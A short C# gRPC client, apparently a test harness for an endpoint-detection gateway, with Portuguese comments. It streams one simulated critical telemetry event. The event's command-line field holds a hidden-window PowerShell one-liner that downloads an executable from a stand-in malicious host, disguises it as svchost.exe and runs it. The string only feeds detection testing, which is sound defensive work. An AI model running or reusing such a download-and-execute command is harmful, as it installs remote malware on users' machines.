using Grpc.Net.Client;
using EdrGateway.Protos;

Console.WriteLine("[AGENTE] A iniciar Motor de Segurança de Endpoints...");

// Estabelecer ligação ao Gateway
using var channel = GrpcChannel.ForAddress("http://localhost:5195");
var client = new TelemetryIngestor.TelemetryIngestorClient(channel);

// Abrir o fluxo de comunicação contínua (Stream)
using var call = client.StreamEvents();

Console.WriteLine("[AGENTE] A simular deteção de processo malicioso na memória...");

// Injetar a telemetria do malware
await call.RequestStream.WriteAsync(new TelemetryEvent
{
    AgentId = "DESKTOP-LSZ",
    Severity = "CRITICAL",
    EventType = "ProcessExecution",
    ProcessName = "powershell.exe",
    CommandLine = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://ip-malicioso.com/malware.exe' -OutFile 'C:\\temp\\svchost.exe'; Start-Process 'C:\\temp\\svchost.exe'\"",
    ParentProcess = "cmd.exe"
});

// Fechar o fluxo (dizer ao servidor que terminámos de enviar)
await call.RequestStream.CompleteAsync();

// Aguardar a confirmação de receção pelo Gateway
var response = await call;
Console.WriteLine($"[AGENTE] Resposta do Gateway: {response.Message}");